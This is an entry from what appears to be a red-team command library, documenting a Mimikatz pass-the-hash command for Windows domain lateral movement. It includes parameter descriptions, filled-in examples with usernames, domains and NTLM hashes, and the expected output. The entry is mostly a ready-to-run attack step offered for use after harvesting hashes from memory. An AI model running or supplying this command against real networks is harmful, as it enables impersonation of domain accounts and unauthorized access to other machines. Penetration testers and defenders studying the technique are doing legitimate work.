---
id: 93896953-646c-472a-9051-a2647831503d
name: mimikatz-pass-the-hash
type: command
executor: cmd
data: >-
  mimikatz.exe "sekurlsa::pth /user:$_USER /domain:$_DOMAIN /ntlm:$_NTLM_HASH
  /run:$_COMMAND"
output: null
created_at: '2023-04-06T03:56:27.240522+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - pass-the-hash
  - lateral-movement
verified: true
validated: true
---

# mimikatz-pass-the-hash

## Command

```cmd
mimikatz.exe "sekurlsa::pth /user:$_USER /domain:$_DOMAIN /ntlm:$_NTLM_HASH /run:$_COMMAND"
```

## Description

This command uses Mimikatz to perform a Pass the Hash attack by creating an access token with a provided NTLM hash, impersonating a user in a specified domain, and executing a command (e.g., PowerShell) under that token. It enables lateral movement to remote Windows systems without needing the plaintext password. Use this after obtaining an NTLM hash from memory dumps or other sources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USER | Username to impersonate (e.g., SCCM$) | Yes |
| /domain:$_DOMAIN | Domain of the user (e.g., IDENTITY) | Yes |
| /ntlm:$_NTLM_HASH | NTLM hash of the user's password (32-character hex) | Yes |
| /run:$_COMMAND | Command to execute under the new token (e.g., powershell.exe) | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe"
```

### Advanced Usage

```cmd
mimikatz.exe "sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:"cmd.exe /c whoami /all""
```

## Expected Output

When successful, Mimikatz outputs confirmation of privilege elevation, token creation, and command execution:

```
Privilege '20' OK
.***** PROCESS *****
Process PID : 1234
Token "Primary" OK
Access token OK
Command reflected
Process exit code 0
```

A new shell (e.g., PowerShell) opens with the impersonated user's privileges, allowing commands like `whoami` to show the target user context. Failures may show "ERROR kuhl_m_sekurlsa_acquireLSA ; LSA access denied" if privileges are insufficient.

## Related

- [[procedures/Pass-The-Hash-with-Mimikatz]]
- [[tools/Mimikatz]]
